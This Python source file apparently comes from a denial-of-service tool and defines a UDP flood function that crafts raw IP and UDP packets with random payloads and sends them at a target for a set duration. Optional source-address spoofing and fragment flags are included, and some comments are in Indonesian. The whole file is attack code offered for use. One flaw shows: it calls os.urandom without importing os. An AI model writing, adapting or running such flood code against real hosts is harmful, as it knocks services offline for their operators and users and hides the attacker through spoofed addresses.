import socket
import time
import logging
import random
import struct
from utils import spoofing, adaptive

log = logging.getLogger(__name__)

def attack(target, port, duration, data_size=1024, spoof=False, fragment=False):
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0

    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                # --- IP Header ---
                ip_version = 4
                ip_ihl = 5
                ip_tos = 0
                ip_total_length = 20 + 8 + data_size #  Header IP + Header UDP + Data
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                if fragment:
                    ip_frag_off =  0x2000  # Set flag More Fragments (MF)
                ip_ttl = random.randint(64,255)
                ip_protocol = socket.IPPROTO_UDP
                ip_checksum = 0
                if spoof:
                    ip_saddr = spoofing.generate_random_ip()
                else:
                    ip_saddr = "192.168.1.100" # Ganti
                ip_daddr = socket.inet_aton(target)

                ip_header = struct.pack('!BBHHHBBH4s4s', (ip_version << 4) + ip_ihl, ip_tos, ip_total_length,
                                    ip_id, ip_frag_off, ip_ttl, ip_protocol, ip_checksum,
                                    socket.inet_aton(ip_saddr), ip_daddr)


                # --- UDP Header ---
                udp_source_port = random.randint(1024, 65535)
                udp_dest_port = port
                udp_length = 8 + data_size
                udp_checksum = 0

                udp_header = struct.pack('!HHHH', udp_source_port, udp_dest_port, udp_length, udp_checksum)

                # --- Data ---
                data = os.urandom(data_size)

                # --- Kirim Paket ---
                packet = ip_header + udp_header + data
                s.sendto(packet, (target, 0))
                packets_sent += 1

            except socket.error as e:
                log.error(f"Socket error: {e}")
                break #Keluar
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break

    except KeyboardInterrupt:
        pass
    finally:
        if 's' in locals() and s:
          s.close()
        log.info(f"UDP flood attack finished. Sent {packets_sent} packets.")